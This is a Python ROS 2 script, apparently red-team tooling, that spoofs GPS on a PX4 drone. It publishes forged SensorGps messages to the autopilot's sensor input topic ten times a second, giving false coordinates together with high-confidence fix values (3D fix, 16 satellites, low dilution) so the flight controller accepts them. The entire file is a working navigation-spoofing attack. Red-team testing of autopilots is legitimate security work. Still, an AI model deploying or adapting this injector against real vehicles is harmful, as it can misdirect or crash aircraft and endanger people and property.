#!/usr/bin/env python3

import rclpy
from rclpy.node import Node
from px4_msgs.msg import SensorGps
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy

class GpsSpoofer(Node):
    def __init__(self):
        super().__init__('gps_spoofer')

        qos_profile = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            depth=1
        )

        self.publisher = self.create_publisher(SensorGps, '/fmu/in/sensor_gps', qos_profile)
        self.timer = self.create_timer(0.1, self.timer_callback)
	
	# setting fake coords
        self.fake_lat = -82.8628 
        self.fake_lon = 135.0000 
        self.fake_alt = 50.0      

        self.get_logger().warn('RED TEAM: Modern GPS Spoofer Active. Injecting false telemetry...')

    def timer_callback(self):
        msg = SensorGps()

        msg.timestamp = int(self.get_clock().now().nanoseconds / 1000)
        msg.timestamp_sample = msg.timestamp
        msg.device_id = 123456

        # Inject fake coords
        msg.latitude_deg = self.fake_lat
        msg.longitude_deg = self.fake_lon
        msg.altitude_msl_m = self.fake_alt
        msg.altitude_ellipsoid_m = self.fake_alt

        msg.fix_type = 3              
        msg.satellites_used = 16      
        msg.eph = 0.5                 
        msg.epv = 0.5                 
        msg.hdop = 0.5 
        msg.vdop = 0.5
        msg.vel_ned_valid = True

        self.publisher.publish(msg)

def main(args=None):
    rclpy.init(args=args)
    node = GpsSpoofer()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()

if __name__ == '__main__':
    main()
